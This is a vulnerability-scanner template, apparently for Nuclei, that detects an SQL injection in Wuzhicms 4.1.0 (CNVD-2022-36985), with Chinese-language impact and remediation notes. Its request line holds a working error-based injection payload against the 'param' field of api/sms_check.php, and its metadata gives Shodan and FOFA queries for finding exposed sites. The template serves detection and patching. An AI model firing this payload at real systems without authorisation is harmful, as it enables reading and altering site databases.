id: CNVD-2022-36985

info:
  name: Wuzhicms 4.1.0 SQL 注入漏洞（CNVD-2022-36985）
  author: princechaddha
  severity: critical
  description: |
    Wuzhicms 4.1.0 的 `api/sms_check.php` 对 `param` 参数过滤不足，存在 SQL 注入。模板通过 `updatexml` 注入并匹配 MD5 错误回显确认数据库查询可控。
  impact: |
    - 攻击者可读取或篡改 Wuzhicms 数据库中的用户、内容和站点配置。
    - 在高权限数据库环境下，漏洞可能进一步导致文件写入或服务器权限扩大。
  remediation: |
    - 升级 Wuzhicms 至修复版本，修复 `sms_check.php` 参数注入问题。
    - 所有数据库查询使用参数化语句，并对 API 参数进行类型和长度校验。
    - 检查数据库错误日志和异常访问记录，轮换可能泄露的后台与数据库凭据。
  reference:
    - https://github.com/wuzhicms/wuzhicms/issues/184
    - https://vulners.com/cnvd/CNVD-2022-36985
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-89
    cpe: cpe:2.3:a:wuzhicms:wuzhicms:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.html:"Wuzhicms"
    fofa-query: title="Wuzhicms"
    product: wuzhicms
    vendor: wuzhicms
  tags: cnvd,cnvd2022,wuzhicms,sqli,vuln

variables:
  num: "999999999"

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20md5({{num}})),0x7e),1)--%20"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'c8c605999f3d8352d7bb792cf3fdb25'

      - type: status
        status:
          - 200
